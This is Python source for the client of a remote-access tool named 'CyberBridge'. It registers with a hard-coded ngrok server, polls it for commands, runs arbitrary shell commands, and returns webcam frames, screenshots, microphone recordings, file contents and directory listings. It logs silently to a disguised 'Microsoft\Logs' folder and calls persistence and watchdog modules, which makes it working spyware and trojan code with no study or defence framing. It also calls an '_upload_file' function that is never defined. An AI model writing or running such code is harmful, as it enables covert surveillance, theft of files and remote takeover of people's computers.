"""
CyberBridge - Client Entry Point (HTTP transport)
Registers with the server via HTTP POST, then polls for commands and
returns results. Works perfectly behind ngrok (no open ports needed).
"""

import os
import sys
import time
import logging
import threading
import socket
import json
import base64
import io
import wave
import subprocess
import platform
import uuid

# ─── Path setup ───────────────────────────────────────────────────────────────
if getattr(sys, 'frozen', False):
    _ROOT = sys._MEIPASS
    _BASE = os.path.join(sys._MEIPASS, 'client')
else:
    _BASE = os.path.dirname(os.path.abspath(__file__))
    _ROOT = os.path.join(_BASE, '..')

sys.path.insert(0, os.path.abspath(_ROOT))
sys.path.insert(0, os.path.abspath(_BASE))

# ─── Logging (silent — file only) ────────────────────────────────────────────
LOG_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
                       "Microsoft", "Logs")
os.makedirs(LOG_DIR, exist_ok=True)
logging.basicConfig(
    filename=os.path.join(LOG_DIR, "wsh.log"),
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger("cyberbridge.client")

# ─── Configuration ────────────────────────────────────────────────────────────
try:
    from config import SERVER_URL, POLL_INTERVAL
except ImportError:
    SERVER_URL    = "https://1b19-190-107-209-205.ngrok-free.app"
    POLL_INTERVAL = 3

# ─── Optional capability imports ─────────────────────────────────────────────
try:
    import cv2
    _CV2_AVAILABLE = True
except ImportError:
    _CV2_AVAILABLE = False

try:
    import pyaudio
    _AUDIO_AVAILABLE = True
except ImportError:
    _AUDIO_AVAILABLE = False

try:
    from PIL import ImageGrab
    _SCREENSHOT_AVAILABLE = True
except ImportError:
    _SCREENSHOT_AVAILABLE = False

try:
    import psutil
    _PSUTIL_AVAILABLE = True
except ImportError:
    _PSUTIL_AVAILABLE = False

try:
    import requests as _requests
    _REQUESTS_AVAILABLE = True
except ImportError:
    _REQUESTS_AVAILABLE = False

# ─── Shared audio state ───────────────────────────────────────────────────────
_AUDIO = {
    "active": False,
    "buffer": b"",
    "error":  None,
    "device": None,
    "lock":   threading.Lock(),
}
_AUDIO_REC = {
    "active": False,
    "frames": [],
    "error":  None,
    "lock":   threading.Lock(),
    "done":   threading.Event(),
}

# ─── Persistent working directory ─────────────────────────────────────────────
_CWD = os.path.expanduser("~")   # starts at home directory

# ─── HTTP helpers ─────────────────────────────────────────────────────────────

def _http_post(path: str, payload: dict) -> dict:
    url = SERVER_URL.rstrip("/") + path
    if _REQUESTS_AVAILABLE:
        try:
            r = _requests.post(url, json=payload, timeout=600)
            return r.json()
        except Exception as e:
            logger.warning("HTTP POST %s failed: %s", path, e)
            return {}
    else:
        import urllib.request
        try:
            data = json.dumps(payload).encode()
            req  = urllib.request.Request(url, data=data,
                                          headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, timeout=600) as resp:
                return json.loads(resp.read())
        except Exception as e:
            logger.warning("HTTP POST %s failed: %s", path, e)
            return {}


def _http_get(path: str) -> dict:
    url = SERVER_URL.rstrip("/") + path
    if _REQUESTS_AVAILABLE:
        try:
            r = _requests.get(url, timeout=600)
            return r.json()
        except Exception as e:
            logger.warning("HTTP GET %s failed: %s", path, e)
            return {}
    else:
        import urllib.request
        try:
            with urllib.request.urlopen(url, timeout=600) as resp:
                return json.loads(resp.read())
        except Exception as e:
            logger.warning("HTTP GET %s failed: %s", path, e)
            return {}


# ─── Registration ─────────────────────────────────────────────────────────────

_ID_FILE = os.path.join(LOG_DIR, "cbid.dat")

def _load_or_create_id() -> str:
    try:
        if os.path.exists(_ID_FILE):
            with open(_ID_FILE) as f:
                return f.read().strip()
    except Exception:
        pass
    cid = str(uuid.uuid4())
    try:
        with open(_ID_FILE, "w") as f:
            f.write(cid)
    except Exception:
        pass
    return cid


_CLIENT_ID = _load_or_create_id()


def _register() -> bool:
    hostname = socket.gethostname()
    try:
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        local_ip = "127.0.0.1"

    resp = _http_post("/register", {
        "client_id": _CLIENT_ID,
        "hostname":  hostname,
        "ip":        local_ip,
        "port":      0,
    })
    ok = resp.get("status") == "ok"
    if ok:
        logger.info("Registered with server as %s (%s)", hostname, _CLIENT_ID)
    return ok


# ─── Command Execution ────────────────────────────────────────────────────────

def _execute_command(cmd: str) -> dict:
    global _CWD
    cmd_str = cmd.strip()

    # ── Handle cd specially (subprocess cd has no persistent effect) ──────────
    if cmd_str.lower() == "cd" or cmd_str.lower().startswith("cd ") \
            or cmd_str.lower().startswith("cd\t"):
        parts  = cmd_str.split(None, 1)
        target = parts[1].strip().strip('"').strip("'") if len(parts) > 1 else ""
        if not target or target == "~":
            new_dir = os.path.expanduser("~")
        elif not os.path.isabs(target):
            new_dir = os.path.normpath(os.path.join(_CWD, target))
        else:
            new_dir = os.path.normpath(target)

        if os.path.isdir(new_dir):
            _CWD = new_dir
            return {"stdout": "", "stderr": "", "returncode": 0,
                    "command": cmd_str, "cwd": _CWD}
        else:
            return {"stdout": "",
                    "stderr": f"No se puede encontrar la ruta: '{new_dir}'",
                    "returncode": 1, "command": cmd_str, "cwd": _CWD}

    # ── Regular command — run in current _CWD ─────────────────────────────────
    try:
        result = subprocess.run(
            cmd_str, shell=True, capture_output=True, text=True,
            timeout=30, cwd=_CWD,
        )
        return {
            "stdout":     result.stdout,
            "stderr":     result.stderr,
            "returncode": result.returncode,
            "command":    cmd_str,
            "cwd":        _CWD,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "Timed out (30s limit)", "returncode": -1,
                "command": cmd_str, "cwd": _CWD}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1,
                "command": cmd_str, "cwd": _CWD}


def _get_system_info() -> dict:
    info = {
        "hostname":  socket.gethostname(),
        "platform":  platform.system(),
        "release":   platform.release(),
        "machine":   platform.machine(),
        "processor": platform.processor(),
        "python":    platform.python_version(),
        "ip":        "127.0.0.1",
    }
    try:
        info["ip"] = socket.gethostbyname(socket.gethostname())
    except Exception:
        pass
    if _PSUTIL_AVAILABLE:
        try:
            info.update({
                "cpu_count":  psutil.cpu_count(),
                "cpu_pct":    psutil.cpu_percent(interval=0.5),
                "ram_total":  psutil.virtual_memory().total,
                "ram_used":   psutil.virtual_memory().used,
                "ram_pct":    psutil.virtual_memory().percent,
                "disk_total": psutil.disk_usage("C:\\").total if platform.system() == "Windows"
                              else psutil.disk_usage("/").total,
                "disk_used":  psutil.disk_usage("C:\\").used  if platform.system() == "Windows"
                              else psutil.disk_usage("/").used,
                "uptime":     time.time() - psutil.boot_time(),
            })
        except Exception:
            pass
    return info


def _get_camera_frame() -> str:
    if not _CV2_AVAILABLE:
        return ""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return ""
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return ""
        _, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
        return base64.b64encode(bytes(buf)).decode()
    except Exception:
        return ""


def _screenshot() -> str:
    if not _SCREENSHOT_AVAILABLE:
        return ""
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=60)
        return base64.b64encode(buf.getvalue()).decode()
    except Exception:
        return ""


def _screen_frame(quality: int = 45, scale: float = 0.6) -> str:
    if not _SCREENSHOT_AVAILABLE:
        return ""
    try:
        img = ImageGrab.grab()
        w = int(img.width * scale)
        h = int(img.height * scale)
        img = img.resize((w, h))
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=quality, optimize=True)
        return base64.b64encode(buf.getvalue()).decode()
    except Exception:
        return ""


def _start_audio_stream() -> bool:
    if not _AUDIO_AVAILABLE:
        return False
    if _AUDIO["active"]:
        return True
    _AUDIO["active"] = True
    _AUDIO["buffer"] = b""
    _AUDIO["error"]  = None

    def _record():
        pa = stream = None
        try:
            pa = pyaudio.PyAudio()
            stream = pa.open(format=pyaudio.paInt16, channels=1,
                             rate=16000, input=True, frames_per_buffer=512)
            _AUDIO["device"] = "microphone (default)"
            while _AUDIO["active"]:
                chunk = stream.read(512, exception_on_overflow=False)
                with _AUDIO["lock"]:
                    _AUDIO["buffer"] += chunk
                    if len(_AUDIO["buffer"]) > 16000:
                        _AUDIO["buffer"] = _AUDIO["buffer"][-16000:]
        except Exception as e:
            _AUDIO["error"]  = str(e)
            _AUDIO["active"] = False
        finally:
            for obj, m in [(stream, "stop_stream"), (stream, "close"), (pa, "terminate")]:
                if obj:
                    try: getattr(obj, m)()
                    except Exception: pass

    threading.Thread(target=_record, daemon=True).start()
    return True


def _stop_audio_stream() -> bool:
    _AUDIO["active"] = False
    return True


def _get_audio_chunk() -> str:
    with _AUDIO["lock"]:
        chunk = _AUDIO["buffer"]
        _AUDIO["buffer"] = b""
    return base64.b64encode(chunk).decode() if chunk else ""


def _start_audio_record() -> bool:
    if not _AUDIO_AVAILABLE:
        return False
    if _AUDIO_REC["active"]:
        return True
    _AUDIO_REC["active"] = True
    _AUDIO_REC["frames"] = []
    _AUDIO_REC["error"]  = None
    _AUDIO_REC["done"].clear()

    def _record():
        pa = stream = None
        try:
            pa = pyaudio.PyAudio()
            stream = pa.open(format=pyaudio.paInt16, channels=1,
                             rate=16000, input=True, frames_per_buffer=512)
            while _AUDIO_REC["active"]:
                chunk = stream.read(512, exception_on_overflow=False)
                with _AUDIO_REC["lock"]:
                    _AUDIO_REC["frames"].append(chunk)
        except Exception as e:
            _AUDIO_REC["error"] = str(e)
            _AUDIO_REC["active"] = False
        finally:
            for obj, m in [(stream, "stop_stream"), (stream, "close"), (pa, "terminate")]:
                if obj:
                    try: getattr(obj, m)()
                    except Exception: pass
            _AUDIO_REC["done"].set()

    threading.Thread(target=_record, daemon=True).start()
    return True


def _stop_audio_record() -> str:
    if not _AUDIO_REC["active"] and not _AUDIO_REC["frames"]:
        return ""
    _AUDIO_REC["active"] = False
    _AUDIO_REC["done"].wait(timeout=6)
    with _AUDIO_REC["lock"]:
        frames = list(_AUDIO_REC["frames"])
        _AUDIO_REC["frames"] = []
    if not frames:
        return ""
    buf = io.BytesIO()
    wf = wave.open(buf, "wb")
    wf.setnchannels(1)
    wf.setsampwidth(2)
    wf.setframerate(16000)
    wf.writeframes(b"".join(frames))
    wf.close()
    return base64.b64encode(buf.getvalue()).decode()


def _download_file(path: str) -> str:
    try:
        if not os.path.exists(path):
            return ""
        with open(path, "rb") as f:
            data = f.read()
        return base64.b64encode(data).decode()
    except Exception as e:
        logger.error(f"Download failed: {e}")
        return ""


def _list_directory(path: str) -> list:
    try:
        entries = []
        for entry in os.scandir(path):
            try:
                entries.append({
                    "name":     entry.name,
                    "is_dir":   entry.is_dir(),
                    "size":     entry.stat().st_size if not entry.is_dir() else 0,
                    "modified": entry.stat().st_mtime,
                })
            except PermissionError:
                continue
        return entries
    except Exception as e:
        return [{"error": str(e)}]


# ─── Command dispatcher ───────────────────────────────────────────────────────

def _dispatch(cmd: dict) -> dict:
    cmd_type = cmd.get("type", "")
    payload  = cmd.get("payload", {})

    try:
        if cmd_type == "ping":
            return {"value": "pong"}
        elif cmd_type == "get_system_info":
            return {"value": _get_system_info()}
        elif cmd_type == "execute_command":
            return {"value": _execute_command(payload.get("command", ""))}
        elif cmd_type == "get_camera_frame":
            return {"value": _get_camera_frame()}
        elif cmd_type == "screenshot":
            return {"value": _screenshot()}
        elif cmd_type == "screen_frame":
            return {"value": _screen_frame(
                payload.get("quality", 45),
                payload.get("scale", 0.6),
            )}
        elif cmd_type == "start_audio_stream":
            return {"value": _start_audio_stream()}
        elif cmd_type == "stop_audio_stream":
            return {"value": _stop_audio_stream()}
        elif cmd_type == "get_audio_chunk":
            return {"value": _get_audio_chunk()}
        elif cmd_type == "start_audio_record":
            return {"value": _start_audio_record()}
        elif cmd_type == "stop_audio_record":
            return {"value": _stop_audio_record()}
        elif cmd_type == "list_directory":
            return {"value": _list_directory(payload.get("path", "."))}
        elif cmd_type == "upload_file":
            return {"value": _upload_file(
                payload.get("path", ""),
                payload.get("data", ""),
            )}
        else:
            return {"error": f"Unknown command: {cmd_type}"}
    except Exception as e:
        return {"error": str(e)}


# ─── Main poll loop ────────────────────────────────────────────────────────────

def _poll_loop():
    while True:
        try:
            resp = _http_get(f"/commands/{_CLIENT_ID}")
            cmds = resp.get("commands", [])
            for cmd in cmds:
                result = _dispatch(cmd)
                _http_post(f"/result/{_CLIENT_ID}", {
                    "id":     cmd["id"],
                    "result": result,
                })
        except Exception as e:
            logger.warning("Poll loop error: %s", e)
        time.sleep(POLL_INTERVAL)


def _register_loop():
    while True:
        try:
            _register()
        except Exception as e:
            logger.warning("Register error: %s", e)
        time.sleep(30)


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    logger.info("CyberBridge client (HTTP) starting…")

    try:
        from core.persistence import setup_persistence
        setup_persistence()
    except Exception as e:
        logger.warning("Persistence setup error: %s", e)

    try:
        from core.watchdog import run_watchdog_if_requested, start_watchdog
        if run_watchdog_if_requested():
            return
        start_watchdog()
    except Exception as e:
        logger.warning("Watchdog error: %s", e)

    deadline = time.time() + 60
    while time.time() < deadline:
        if _register():
            break
        logger.info("Waiting to register with server…")
        time.sleep(5)

    threading.Thread(target=_register_loop, daemon=True).start()
    threading.Thread(target=_poll_loop,     daemon=True).start()

    logger.info("CyberBridge client fully operational.")

    while True:
        time.sleep(60)


if __name__ == "__main__":
    main()
